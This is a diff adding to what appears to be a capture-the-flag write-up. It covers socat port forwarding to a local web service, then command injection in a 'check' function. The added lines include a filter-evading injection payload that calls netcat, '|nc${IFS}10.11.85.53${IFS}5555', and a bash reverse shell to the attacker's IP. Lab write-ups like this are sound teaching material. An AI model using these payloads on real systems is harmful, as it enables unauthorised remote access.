@@ -30,6 +30,13 @@ Linpeas also shows a local service at 127.0.0.1:9999. With `curl` I was able to 
 2) In the attacker machine: run `socat TCP4-LISTEN:9998,reuseaddr,fork TCP4:target_ip:8888`
 So we are opening port 9998 on the attacker machine and redirecting everything coming in that port to target IP port 8888. Similarly, from the target machine, we redirect everything coming in port 8888 to localhost port 9999, thus accessing the web service. <br />
 ![image](https://github.com/user-attachments/assets/8d881702-0350-444b-85ed-06f9f0affb30)<br />
+The "Check Target" function performs a ping command to the specified IP address. This is very likely a command injection exploit. Here's a list of special characters:<br />
+`! @ # $ % ^ & * ( ) - _ = + \ | [ ] { } ; : / ? . >`. <br />
+After hours of trying payloads, I found that this `|nc${IFS}10.11.85.53${IFS}5555` worked on the "check user" section. <br />
+![image](https://github.com/user-attachments/assets/ef3b720f-e148-4c22-aa4d-23731faf2308)<br />
+Now, to get a reverse shell, since we can't use `-`, what we can do is create a `rev.sh` file in our attacker's machine(can be found inside this folder)
+/bin/bash -i >& /dev/tcp/10.11.85.53/6666 0>&1
+![image](https://github.com/user-attachments/assets/5efb5384-f0ed-4d03-ad29-ed0535c63592)
 
 
 
